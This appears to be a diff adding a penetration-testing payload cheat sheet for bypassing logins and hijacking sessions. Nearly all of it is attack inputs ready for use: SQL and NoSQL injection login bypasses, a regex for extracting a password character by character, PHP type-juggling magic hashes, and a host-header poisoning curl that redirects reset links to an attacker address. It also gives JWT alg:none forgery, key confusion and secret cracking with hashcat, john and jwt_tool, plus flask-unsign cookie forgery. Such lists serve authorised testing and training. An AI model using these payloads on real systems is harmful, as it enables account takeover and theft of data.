@@ -1,0 +1,45 @@
+# Authentication & session — bypass the login or ride someone else's session.
+
+## SQLi auth bypass (username and/or password field)
+' OR '1'='1'-- -
+admin'-- -
+admin'#
+' OR 1=1 LIMIT 1-- -
+') OR ('1'='1'-- -
+' UNION SELECT 1,'admin','pass'-- -        # when login reads a row back
+"-"                                          # some ORMs: empty-ish truthy
+
+## Type juggling (PHP ==) — see magic-hashes.txt for the hash collisions
+{"password":0}        {"password":true}      password[]=1
+# magic MD5 (0e...) values that compare-equal to another 0e hash:
+240610708   QNKCDZO   aabg7XSs
+
+## NoSQL auth bypass (JSON body)
+{"username":"admin","password":{"$ne":null}}
+{"username":{"$ne":null},"password":{"$ne":null}}
+{"username":"admin","password":{"$gt":""}}
+{"username":"admin","password":{"$regex":"^a"}}    # exfil the password char-by-char
+# form style:
+username=admin&password[$ne]=x
+
+## Logic / flow
+# - register a username that collides (admin + trailing space "admin ", "Admin", "admin\t")
+# - response says "wrong password" vs "no such user" -> user enumeration -> spray
+# - password reset: token in the response, token not bound to the account, host-header poisoning
+#   curl -s URL/forgot -d email=victim@x -H 'X-Forwarded-Host: YOUR_IP'   (reset link points at you)
+# - OAuth/SSO: open redirect in redirect_uri, state reuse
+
+## JWT
+# alg:none
+{"alg":"none","typ":"JWT"}  . {"user":"admin","role":"admin"} . (empty signature)
+# weak HS256 secret -> crack:  hashcat -a0 -m16500 jwt.txt rockyou.txt   /  john jwt.txt --wordlist=rockyou.txt
+# RS256 -> HS256 confusion: sign with the server's PUBLIC key as the HMAC secret
+jwt_tool <JWT> -X a                 # alg:none
+jwt_tool <JWT> -X k -pk public.pem  # key confusion
+jwt_tool <JWT> -C -d rockyou.txt    # crack secret
+
+## Session
+# - does the cookie change after login? (fixation if not)  - cleared on logout + password change?
+# - Flask 'session=' is signed, not encrypted: flask-unsign --decode --cookie '<cookie>'
+#   crack + forge:  flask-unsign --unsign --cookie '<cookie>' --wordlist rockyou.txt
+# - cookie flags: missing HttpOnly -> XSS can steal it; missing SameSite -> CSRF
